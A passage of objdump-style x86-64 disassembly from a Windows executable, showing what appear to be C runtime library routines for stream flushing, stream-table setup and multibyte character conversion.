   14000b721:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000b726:	56                   	push   %rsi
   14000b727:	57                   	push   %rdi
   14000b728:	41 56                	push   %r14
   14000b72a:	48 83 ec 60          	sub    $0x60,%rsp
   14000b72e:	49 8b f9             	mov    %r9,%rdi
   14000b731:	49 8b f0             	mov    %r8,%rsi
   14000b734:	8b 0a                	mov    (%rdx),%ecx
   14000b736:	e8 55 e5 ff ff       	call   0x140009c90
   14000b73b:	90                   	nop
   14000b73c:	48 8b 1d 35 3f 01 00 	mov    0x13f35(%rip),%rbx        # 0x14001f678
   14000b743:	48 63 05 26 3f 01 00 	movslq 0x13f26(%rip),%rax        # 0x14001f670
   14000b74a:	4c 8d 34 c3          	lea    (%rbx,%rax,8),%r14
   14000b74e:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000b753:	49 3b de             	cmp    %r14,%rbx
   14000b756:	0f 84 89 00 00 00    	je     0x14000b7e5
   14000b75c:	48 8b 0b             	mov    (%rbx),%rcx
   14000b75f:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000b764:	48 8b 16             	mov    (%rsi),%rdx
   14000b767:	48 85 c9             	test   %rcx,%rcx
   14000b76a:	74 22                	je     0x14000b78e
   14000b76c:	8b 49 14             	mov    0x14(%rcx),%ecx
   14000b76f:	90                   	nop
   14000b770:	8b c1                	mov    %ecx,%eax
   14000b772:	c1 e8 0d             	shr    $0xd,%eax
   14000b775:	a8 01                	test   $0x1,%al
   14000b777:	74 15                	je     0x14000b78e
   14000b779:	8b c1                	mov    %ecx,%eax
   14000b77b:	24 03                	and    $0x3,%al
   14000b77d:	3c 02                	cmp    $0x2,%al
   14000b77f:	75 05                	jne    0x14000b786
   14000b781:	f6 c1 c0             	test   $0xc0,%cl
   14000b784:	75 0e                	jne    0x14000b794
   14000b786:	0f ba e1 0b          	bt     $0xb,%ecx
   14000b78a:	72 08                	jb     0x14000b794
   14000b78c:	ff 02                	incl   (%rdx)
   14000b78e:	48 83 c3 08          	add    $0x8,%rbx
   14000b792:	eb ba                	jmp    0x14000b74e
   14000b794:	48 8b 56 10          	mov    0x10(%rsi),%rdx
   14000b798:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   14000b79c:	48 8b 06             	mov    (%rsi),%rax
   14000b79f:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000b7a4:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   14000b7a9:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000b7ae:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   14000b7b3:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   14000b7b8:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000b7bd:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000b7c2:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000b7c7:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   14000b7cc:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   14000b7d1:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000b7d6:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   14000b7dd:	00 
   14000b7de:	e8 9d fe ff ff       	call   0x14000b680
   14000b7e3:	eb a9                	jmp    0x14000b78e
   14000b7e5:	8b 0f                	mov    (%rdi),%ecx
   14000b7e7:	e8 f8 e4 ff ff       	call   0x140009ce4
   14000b7ec:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   14000b7f3:	00 
   14000b7f4:	48 83 c4 60          	add    $0x60,%rsp
   14000b7f8:	41 5e                	pop    %r14
   14000b7fa:	5f                   	pop    %rdi
   14000b7fb:	5e                   	pop    %rsi
   14000b7fc:	c3                   	ret
   14000b7fd:	cc                   	int3
   14000b7fe:	cc                   	int3
   14000b7ff:	cc                   	int3
   14000b800:	88 4c 24 08          	mov    %cl,0x8(%rsp)
   14000b804:	55                   	push   %rbp
   14000b805:	48 8b ec             	mov    %rsp,%rbp
   14000b808:	48 83 ec 40          	sub    $0x40,%rsp
   14000b80c:	83 65 28 00          	andl   $0x0,0x28(%rbp)
   14000b810:	48 8d 45 28          	lea    0x28(%rbp),%rax
   14000b814:	83 65 20 00          	andl   $0x0,0x20(%rbp)
   14000b818:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   14000b81c:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000b820:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000b824:	48 8d 45 10          	lea    0x10(%rbp),%rax
   14000b828:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000b82c:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   14000b830:	48 8d 45 20          	lea    0x20(%rbp),%rax
   14000b834:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000b838:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000b83c:	b8 08 00 00 00       	mov    $0x8,%eax
   14000b841:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000b844:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000b847:	e8 d0 fe ff ff       	call   0x14000b71c
   14000b84c:	80 7d 10 00          	cmpb   $0x0,0x10(%rbp)
   14000b850:	8b 45 20             	mov    0x20(%rbp),%eax
   14000b853:	0f 45 45 28          	cmovne 0x28(%rbp),%eax
   14000b857:	48 83 c4 40          	add    $0x40,%rsp
   14000b85b:	5d                   	pop    %rbp
   14000b85c:	c3                   	ret
   14000b85d:	cc                   	int3
   14000b85e:	cc                   	int3
   14000b85f:	cc                   	int3
   14000b860:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b865:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000b86a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000b86f:	57                   	push   %rdi
   14000b870:	48 83 ec 20          	sub    $0x20,%rsp
   14000b874:	48 8b d9             	mov    %rcx,%rbx
   14000b877:	48 8b ea             	mov    %rdx,%rbp
   14000b87a:	8b 49 14             	mov    0x14(%rcx),%ecx
   14000b87d:	8b c1                	mov    %ecx,%eax
   14000b87f:	24 03                	and    $0x3,%al
   14000b881:	90                   	nop
   14000b882:	3c 02                	cmp    $0x2,%al
   14000b884:	75 4f                	jne    0x14000b8d5
   14000b886:	f6 c1 c0             	test   $0xc0,%cl
   14000b889:	74 4a                	je     0x14000b8d5
   14000b88b:	8b 3b                	mov    (%rbx),%edi
   14000b88d:	2b 7b 08             	sub    0x8(%rbx),%edi
   14000b890:	83 63 10 00          	andl   $0x0,0x10(%rbx)
   14000b894:	48 8b 73 08          	mov    0x8(%rbx),%rsi
   14000b898:	48 89 33             	mov    %rsi,(%rbx)
   14000b89b:	85 ff                	test   %edi,%edi
   14000b89d:	7e 36                	jle    0x14000b8d5
   14000b89f:	48 8b cb             	mov    %rbx,%rcx
   14000b8a2:	e8 fd 08 00 00       	call   0x14000c1a4
   14000b8a7:	4c 8b cd             	mov    %rbp,%r9
   14000b8aa:	44 8b c7             	mov    %edi,%r8d
   14000b8ad:	48 8b d6             	mov    %rsi,%rdx
   14000b8b0:	8b c8                	mov    %eax,%ecx
   14000b8b2:	e8 f1 21 00 00       	call   0x14000daa8
   14000b8b7:	3b f8                	cmp    %eax,%edi
   14000b8b9:	74 0a                	je     0x14000b8c5
   14000b8bb:	f0 83 4b 14 10       	lock orl $0x10,0x14(%rbx)
   14000b8c0:	83 c8 ff             	or     $0xffffffff,%eax
   14000b8c3:	eb 12                	jmp    0x14000b8d7
   14000b8c5:	8b 43 14             	mov    0x14(%rbx),%eax
   14000b8c8:	90                   	nop
   14000b8c9:	c1 e8 02             	shr    $0x2,%eax
   14000b8cc:	a8 01                	test   $0x1,%al
   14000b8ce:	74 05                	je     0x14000b8d5
   14000b8d0:	f0 83 63 14 fd       	lock andl $0xfffffffd,0x14(%rbx)
   14000b8d5:	33 c0                	xor    %eax,%eax
   14000b8d7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b8dc:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000b8e1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000b8e6:	48 83 c4 20          	add    $0x20,%rsp
   14000b8ea:	5f                   	pop    %rdi
   14000b8eb:	c3                   	ret
   14000b8ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b8f1:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000b8f6:	55                   	push   %rbp
   14000b8f7:	48 8b ec             	mov    %rsp,%rbp
   14000b8fa:	48 83 ec 60          	sub    $0x60,%rsp
   14000b8fe:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   14000b903:	48 8b d9             	mov    %rcx,%rbx
   14000b906:	83 3d 5f 35 01 00 00 	cmpl   $0x0,0x1355f(%rip)        # 0x14001ee6c
   14000b90d:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   14000b911:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   14000b915:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   14000b919:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   14000b91d:	75 10                	jne    0x14000b92f
   14000b91f:	0f 10 05 22 2e 01 00 	movups 0x12e22(%rip),%xmm0        # 0x14001e748
   14000b926:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   14000b92a:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   14000b92f:	48 85 db             	test   %rbx,%rbx
   14000b932:	75 0b                	jne    0x14000b93f
   14000b934:	33 c9                	xor    %ecx,%ecx
   14000b936:	e8 c5 fe ff ff       	call   0x14000b800
   14000b93b:	8b f8                	mov    %eax,%edi
   14000b93d:	eb 32                	jmp    0x14000b971
   14000b93f:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   14000b943:	e8 18 ff ff ff       	call   0x14000b860
   14000b948:	85 c0                	test   %eax,%eax
   14000b94a:	74 05                	je     0x14000b951
   14000b94c:	83 cf ff             	or     $0xffffffff,%edi
   14000b94f:	eb 20                	jmp    0x14000b971
   14000b951:	8b 43 14             	mov    0x14(%rbx),%eax
   14000b954:	90                   	nop
   14000b955:	c1 e8 0b             	shr    $0xb,%eax
   14000b958:	a8 01                	test   $0x1,%al
   14000b95a:	74 13                	je     0x14000b96f
   14000b95c:	48 8b cb             	mov    %rbx,%rcx
   14000b95f:	e8 40 08 00 00       	call   0x14000c1a4
   14000b964:	8b c8                	mov    %eax,%ecx
   14000b966:	e8 7d 18 00 00       	call   0x14000d1e8
   14000b96b:	85 c0                	test   %eax,%eax
   14000b96d:	75 dd                	jne    0x14000b94c
   14000b96f:	33 ff                	xor    %edi,%edi
   14000b971:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   14000b975:	75 0b                	jne    0x14000b982
   14000b977:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   14000b97b:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000b982:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   14000b986:	74 0f                	je     0x14000b997
   14000b988:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   14000b98b:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000b98f:	e8 cc b9 ff ff       	call   0x140007360
   14000b994:	89 58 20             	mov    %ebx,0x20(%rax)
   14000b997:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000b99b:	74 0f                	je     0x14000b9ac
   14000b99d:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   14000b9a0:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000b9a4:	e8 b7 b9 ff ff       	call   0x140007360
   14000b9a9:	89 58 24             	mov    %ebx,0x24(%rax)
   14000b9ac:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000b9b1:	8b c7                	mov    %edi,%eax
   14000b9b3:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   14000b9b8:	48 83 c4 60          	add    $0x60,%rsp
   14000b9bc:	5d                   	pop    %rbp
   14000b9bd:	c3                   	ret
   14000b9be:	cc                   	int3
   14000b9bf:	cc                   	int3
   14000b9c0:	b1 01                	mov    $0x1,%cl
   14000b9c2:	e9 39 fe ff ff       	jmp    0x14000b800
   14000b9c7:	cc                   	int3
   14000b9c8:	48 8b c4             	mov    %rsp,%rax
   14000b9cb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000b9cf:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000b9d3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000b9d7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000b9db:	41 56                	push   %r14
   14000b9dd:	48 83 ec 20          	sub    $0x20,%rsp
   14000b9e1:	8b 05 89 3c 01 00    	mov    0x13c89(%rip),%eax        # 0x14001f670
   14000b9e7:	33 db                	xor    %ebx,%ebx
   14000b9e9:	bf 03 00 00 00       	mov    $0x3,%edi
   14000b9ee:	85 c0                	test   %eax,%eax
   14000b9f0:	75 07                	jne    0x14000b9f9
   14000b9f2:	b8 00 02 00 00       	mov    $0x200,%eax
   14000b9f7:	eb 06                	jmp    0x14000b9ff
   14000b9f9:	3b c7                	cmp    %edi,%eax
   14000b9fb:	7d 08                	jge    0x14000ba05
   14000b9fd:	8b c7                	mov    %edi,%eax
   14000b9ff:	89 05 6b 3c 01 00    	mov    %eax,0x13c6b(%rip)        # 0x14001f670
   14000ba05:	48 63 c8             	movslq %eax,%rcx
   14000ba08:	ba 08 00 00 00       	mov    $0x8,%edx
   14000ba0d:	e8 7e c5 ff ff       	call   0x140007f90
   14000ba12:	33 c9                	xor    %ecx,%ecx
   14000ba14:	48 89 05 5d 3c 01 00 	mov    %rax,0x13c5d(%rip)        # 0x14001f678
   14000ba1b:	e8 f0 c5 ff ff       	call   0x140008010
   14000ba20:	48 39 1d 51 3c 01 00 	cmp    %rbx,0x13c51(%rip)        # 0x14001f678
   14000ba27:	75 2f                	jne    0x14000ba58
   14000ba29:	ba 08 00 00 00       	mov    $0x8,%edx
   14000ba2e:	89 3d 3c 3c 01 00    	mov    %edi,0x13c3c(%rip)        # 0x14001f670
   14000ba34:	48 8b cf             	mov    %rdi,%rcx
   14000ba37:	e8 54 c5 ff ff       	call   0x140007f90
   14000ba3c:	33 c9                	xor    %ecx,%ecx
   14000ba3e:	48 89 05 33 3c 01 00 	mov    %rax,0x13c33(%rip)        # 0x14001f678
   14000ba45:	e8 c6 c5 ff ff       	call   0x140008010
   14000ba4a:	48 39 1d 27 3c 01 00 	cmp    %rbx,0x13c27(%rip)        # 0x14001f678
   14000ba51:	75 05                	jne    0x14000ba58
   14000ba53:	83 c8 ff             	or     $0xffffffff,%eax
   14000ba56:	eb 75                	jmp    0x14000bacd
   14000ba58:	48 8b eb             	mov    %rbx,%rbp
   14000ba5b:	48 8d 35 c6 2d 01 00 	lea    0x12dc6(%rip),%rsi        # 0x14001e828
   14000ba62:	4c 8d 35 a7 2d 01 00 	lea    0x12da7(%rip),%r14        # 0x14001e810
   14000ba69:	49 8d 4e 30          	lea    0x30(%r14),%rcx
   14000ba6d:	45 33 c0             	xor    %r8d,%r8d
   14000ba70:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   14000ba75:	e8 1e f4 ff ff       	call   0x14000ae98
   14000ba7a:	48 8b 05 f7 3b 01 00 	mov    0x13bf7(%rip),%rax        # 0x14001f678
   14000ba81:	4c 8d 05 e8 36 01 00 	lea    0x136e8(%rip),%r8        # 0x14001f170
   14000ba88:	48 8b d5             	mov    %rbp,%rdx
   14000ba8b:	48 c1 fa 06          	sar    $0x6,%rdx
   14000ba8f:	4c 89 34 03          	mov    %r14,(%rbx,%rax,1)
   14000ba93:	48 8b c5             	mov    %rbp,%rax
   14000ba96:	83 e0 3f             	and    $0x3f,%eax
   14000ba99:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   14000ba9d:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   14000baa1:	48 8b 4c c8 28       	mov    0x28(%rax,%rcx,8),%rcx
   14000baa6:	48 83 c1 02          	add    $0x2,%rcx
   14000baaa:	48 83 f9 02          	cmp    $0x2,%rcx
   14000baae:	77 06                	ja     0x14000bab6
   14000bab0:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%rsi)
   14000bab6:	48 ff c5             	inc    %rbp
   14000bab9:	49 83 c6 58          	add    $0x58,%r14
   14000babd:	48 83 c3 08          	add    $0x8,%rbx
   14000bac1:	48 83 c6 58          	add    $0x58,%rsi
   14000bac5:	48 83 ef 01          	sub    $0x1,%rdi
   14000bac9:	75 9e                	jne    0x14000ba69
   14000bacb:	33 c0                	xor    %eax,%eax
   14000bacd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000bad2:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000bad7:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000badc:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000bae1:	48 83 c4 20          	add    $0x20,%rsp
   14000bae5:	41 5e                	pop    %r14
   14000bae7:	c3                   	ret
   14000bae8:	40 53                	rex push %rbx
   14000baea:	48 83 ec 20          	sub    $0x20,%rsp
   14000baee:	e8 cd fe ff ff       	call   0x14000b9c0
   14000baf3:	e8 00 24 00 00       	call   0x14000def8
   14000baf8:	33 db                	xor    %ebx,%ebx
   14000bafa:	48 8b 0d 77 3b 01 00 	mov    0x13b77(%rip),%rcx        # 0x14001f678
   14000bb01:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   14000bb05:	e8 a2 24 00 00       	call   0x14000dfac
   14000bb0a:	48 8b 05 67 3b 01 00 	mov    0x13b67(%rip),%rax        # 0x14001f678
   14000bb11:	48 8b 0c 03          	mov    (%rbx,%rax,1),%rcx
   14000bb15:	48 83 c1 30          	add    $0x30,%rcx
   14000bb19:	ff 15 c1 45 00 00    	call   *0x45c1(%rip)        # 0x1400100e0
   14000bb1f:	48 83 c3 08          	add    $0x8,%rbx
   14000bb23:	48 83 fb 18          	cmp    $0x18,%rbx
   14000bb27:	75 d1                	jne    0x14000bafa
   14000bb29:	48 8b 0d 48 3b 01 00 	mov    0x13b48(%rip),%rcx        # 0x14001f678
   14000bb30:	e8 db c4 ff ff       	call   0x140008010
   14000bb35:	48 83 25 3b 3b 01 00 	andq   $0x0,0x13b3b(%rip)        # 0x14001f678
   14000bb3c:	00 
   14000bb3d:	48 83 c4 20          	add    $0x20,%rsp
   14000bb41:	5b                   	pop    %rbx
   14000bb42:	c3                   	ret
   14000bb43:	cc                   	int3
   14000bb44:	48 83 c1 30          	add    $0x30,%rcx
   14000bb48:	48 ff 25 79 45 00 00 	rex.W jmp *0x4579(%rip)        # 0x1400100c8
   14000bb4f:	cc                   	int3
   14000bb50:	48 83 c1 30          	add    $0x30,%rcx
   14000bb54:	48 ff 25 75 45 00 00 	rex.W jmp *0x4575(%rip)        # 0x1400100d0
   14000bb5b:	cc                   	int3
   14000bb5c:	40 53                	rex push %rbx
   14000bb5e:	48 83 ec 20          	sub    $0x20,%rsp
   14000bb62:	48 8b 05 0f 3a 01 00 	mov    0x13a0f(%rip),%rax        # 0x14001f578
   14000bb69:	48 8b da             	mov    %rdx,%rbx
   14000bb6c:	48 39 02             	cmp    %rax,(%rdx)
   14000bb6f:	74 16                	je     0x14000bb87
   14000bb71:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000bb77:	85 05 83 2c 01 00    	test   %eax,0x12c83(%rip)        # 0x14001e800
   14000bb7d:	75 08                	jne    0x14000bb87
   14000bb7f:	e8 b4 ef ff ff       	call   0x14000ab38
   14000bb84:	48 89 03             	mov    %rax,(%rbx)
   14000bb87:	48 83 c4 20          	add    $0x20,%rsp
   14000bb8b:	5b                   	pop    %rbx
   14000bb8c:	c3                   	ret
   14000bb8d:	cc                   	int3
   14000bb8e:	cc                   	int3
   14000bb8f:	cc                   	int3
   14000bb90:	40 53                	rex push %rbx
   14000bb92:	48 83 ec 20          	sub    $0x20,%rsp
   14000bb96:	48 8d 05 db 39 01 00 	lea    0x139db(%rip),%rax        # 0x14001f578
   14000bb9d:	48 8b da             	mov    %rdx,%rbx
   14000bba0:	4a 8b 04 c0          	mov    (%rax,%r8,8),%rax
   14000bba4:	48 39 02             	cmp    %rax,(%rdx)
   14000bba7:	74 16                	je     0x14000bbbf
   14000bba9:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000bbaf:	85 05 4b 2c 01 00    	test   %eax,0x12c4b(%rip)        # 0x14001e800
   14000bbb5:	75 08                	jne    0x14000bbbf
   14000bbb7:	e8 7c ef ff ff       	call   0x14000ab38
   14000bbbc:	48 89 03             	mov    %rax,(%rbx)
   14000bbbf:	48 83 c4 20          	add    $0x20,%rsp
   14000bbc3:	5b                   	pop    %rbx
   14000bbc4:	c3                   	ret
   14000bbc5:	cc                   	int3
   14000bbc6:	cc                   	int3
   14000bbc7:	cc                   	int3
   14000bbc8:	40 53                	rex push %rbx
   14000bbca:	48 83 ec 20          	sub    $0x20,%rsp
   14000bbce:	48 8b 05 f3 32 01 00 	mov    0x132f3(%rip),%rax        # 0x14001eec8
   14000bbd5:	48 8b da             	mov    %rdx,%rbx
   14000bbd8:	48 39 02             	cmp    %rax,(%rdx)
   14000bbdb:	74 16                	je     0x14000bbf3
   14000bbdd:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000bbe3:	85 05 17 2c 01 00    	test   %eax,0x12c17(%rip)        # 0x14001e800
   14000bbe9:	75 08                	jne    0x14000bbf3
   14000bbeb:	e8 44 da ff ff       	call   0x140009634
   14000bbf0:	48 89 03             	mov    %rax,(%rbx)
   14000bbf3:	48 83 c4 20          	add    $0x20,%rsp
   14000bbf7:	5b                   	pop    %rbx
   14000bbf8:	c3                   	ret
   14000bbf9:	cc                   	int3
   14000bbfa:	cc                   	int3
   14000bbfb:	cc                   	int3
   14000bbfc:	40 53                	rex push %rbx
   14000bbfe:	48 83 ec 20          	sub    $0x20,%rsp
   14000bc02:	48 8d 05 bf 32 01 00 	lea    0x132bf(%rip),%rax        # 0x14001eec8
   14000bc09:	48 8b da             	mov    %rdx,%rbx
   14000bc0c:	4a 8b 04 c0          	mov    (%rax,%r8,8),%rax
   14000bc10:	48 39 02             	cmp    %rax,(%rdx)
   14000bc13:	74 16                	je     0x14000bc2b
   14000bc15:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000bc1b:	85 05 df 2b 01 00    	test   %eax,0x12bdf(%rip)        # 0x14001e800
   14000bc21:	75 08                	jne    0x14000bc2b
   14000bc23:	e8 0c da ff ff       	call   0x140009634
   14000bc28:	48 89 03             	mov    %rax,(%rbx)
   14000bc2b:	48 83 c4 20          	add    $0x20,%rsp
   14000bc2f:	5b                   	pop    %rbx
   14000bc30:	c3                   	ret
   14000bc31:	cc                   	int3
   14000bc32:	cc                   	int3
   14000bc33:	cc                   	int3
   14000bc34:	48 8b c4             	mov    %rsp,%rax
   14000bc37:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000bc3b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000bc3f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000bc43:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000bc47:	41 56                	push   %r14
   14000bc49:	48 83 ec 30          	sub    $0x30,%rsp
   14000bc4d:	45 33 f6             	xor    %r14d,%r14d
   14000bc50:	49 8b d9             	mov    %r9,%rbx
   14000bc53:	49 8b e8             	mov    %r8,%rbp
   14000bc56:	48 8b f2             	mov    %rdx,%rsi
   14000bc59:	48 8b f9             	mov    %rcx,%rdi
   14000bc5c:	48 85 d2             	test   %rdx,%rdx
   14000bc5f:	0f 84 23 01 00 00    	je     0x14000bd88
   14000bc65:	4d 85 c0             	test   %r8,%r8
   14000bc68:	0f 84 1a 01 00 00    	je     0x14000bd88
   14000bc6e:	44 38 32             	cmp    %r14b,(%rdx)
   14000bc71:	75 12                	jne    0x14000bc85
   14000bc73:	48 85 c9             	test   %rcx,%rcx
   14000bc76:	0f 84 13 01 00 00    	je     0x14000bd8f
   14000bc7c:	66 44 89 31          	mov    %r14w,(%rcx)
   14000bc80:	e9 0a 01 00 00       	jmp    0x14000bd8f
   14000bc85:	45 38 71 28          	cmp    %r14b,0x28(%r9)
   14000bc89:	75 08                	jne    0x14000bc93
   14000bc8b:	48 8b cb             	mov    %rbx,%rcx
   14000bc8e:	e8 3d b7 ff ff       	call   0x1400073d0
   14000bc93:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   14000bc97:	44 8b 52 0c          	mov    0xc(%rdx),%r10d
   14000bc9b:	41 81 fa e9 fd 00 00 	cmp    $0xfde9,%r10d
   14000bca2:	75 27                	jne    0x14000bccb
   14000bca4:	4c 8d 0d e5 39 01 00 	lea    0x139e5(%rip),%r9        # 0x14001f690
   14000bcab:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000bcb0:	4c 8b c5             	mov    %rbp,%r8
   14000bcb3:	48 8b d6             	mov    %rsi,%rdx
   14000bcb6:	48 8b cf             	mov    %rdi,%rcx
   14000bcb9:	e8 e6 02 00 00       	call   0x14000bfa4
   14000bcbe:	83 c9 ff             	or     $0xffffffff,%ecx
   14000bcc1:	85 c0                	test   %eax,%eax
   14000bcc3:	0f 48 c1             	cmovs  %ecx,%eax
   14000bcc6:	e9 c6 00 00 00       	jmp    0x14000bd91
   14000bccb:	4c 39 b2 38 01 00 00 	cmp    %r14,0x138(%rdx)
   14000bcd2:	75 14                	jne    0x14000bce8
   14000bcd4:	48 85 ff             	test   %rdi,%rdi
   14000bcd7:	0f 84 a4 00 00 00    	je     0x14000bd81
   14000bcdd:	0f b6 06             	movzbl (%rsi),%eax
   14000bce0:	66 89 07             	mov    %ax,(%rdi)
   14000bce3:	e9 99 00 00 00       	jmp    0x14000bd81
   14000bce8:	0f b6 0e             	movzbl (%rsi),%ecx
   14000bceb:	48 8b 02             	mov    (%rdx),%rax
   14000bcee:	66 44 39 34 48       	cmp    %r14w,(%rax,%rcx,2)
   14000bcf3:	7d 61                	jge    0x14000bd56
   14000bcf5:	44 8b 4a 08          	mov    0x8(%rdx),%r9d
   14000bcf9:	41 83 f9 01          	cmp    $0x1,%r9d
   14000bcfd:	7e 2b                	jle    0x14000bd2a
   14000bcff:	41 3b e9             	cmp    %r9d,%ebp
   14000bd02:	7c 26                	jl     0x14000bd2a
   14000bd04:	41 8b c6             	mov    %r14d,%eax
   14000bd07:	48 85 ff             	test   %rdi,%rdi
   14000bd0a:	4c 8b c6             	mov    %rsi,%r8
   14000bd0d:	ba 09 00 00 00       	mov    $0x9,%edx
   14000bd12:	0f 95 c0             	setne  %al
   14000bd15:	41 8b ca             	mov    %r10d,%ecx
   14000bd18:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000bd1c:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000bd21:	e8 a2 dc ff ff       	call   0x1400099c8
   14000bd26:	85 c0                	test   %eax,%eax
   14000bd28:	75 13                	jne    0x14000bd3d
   14000bd2a:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000bd2e:	48 63 48 08          	movslq 0x8(%rax),%rcx
   14000bd32:	48 3b e9             	cmp    %rcx,%rbp
   14000bd35:	72 0f                	jb     0x14000bd46
   14000bd37:	44 38 76 01          	cmp    %r14b,0x1(%rsi)
   14000bd3b:	74 09                	je     0x14000bd46
   14000bd3d:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000bd41:	8b 40 08             	mov    0x8(%rax),%eax
   14000bd44:	eb 4b                	jmp    0x14000bd91
   14000bd46:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000bd4a:	83 c8 ff             	or     $0xffffffff,%eax
   14000bd4d:	c7 43 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rbx)
   14000bd54:	eb 3b                	jmp    0x14000bd91
   14000bd56:	41 8b c6             	mov    %r14d,%eax
   14000bd59:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000bd5f:	48 85 ff             	test   %rdi,%rdi
   14000bd62:	4c 8b c6             	mov    %rsi,%r8
   14000bd65:	41 8b ca             	mov    %r10d,%ecx
   14000bd68:	0f 95 c0             	setne  %al
   14000bd6b:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000bd6f:	41 8d 51 08          	lea    0x8(%r9),%edx
   14000bd73:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000bd78:	e8 4b dc ff ff       	call   0x1400099c8
   14000bd7d:	85 c0                	test   %eax,%eax
   14000bd7f:	74 c5                	je     0x14000bd46
   14000bd81:	b8 01 00 00 00       	mov    $0x1,%eax
   14000bd86:	eb 09                	jmp    0x14000bd91
   14000bd88:	4c 89 35 01 39 01 00 	mov    %r14,0x13901(%rip)        # 0x14001f690
   14000bd8f:	33 c0                	xor    %eax,%eax
   14000bd91:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000bd96:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000bd9b:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000bda0:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   14000bda5:	48 83 c4 30          	add    $0x30,%rsp
   14000bda9:	41 5e                	pop    %r14
   14000bdab:	c3                   	ret
   14000bdac:	8a 11                	mov    (%rcx),%dl
   14000bdae:	33 c0                	xor    %eax,%eax
   14000bdb0:	84 d2                	test   %dl,%dl
   14000bdb2:	78 04                	js     0x14000bdb8
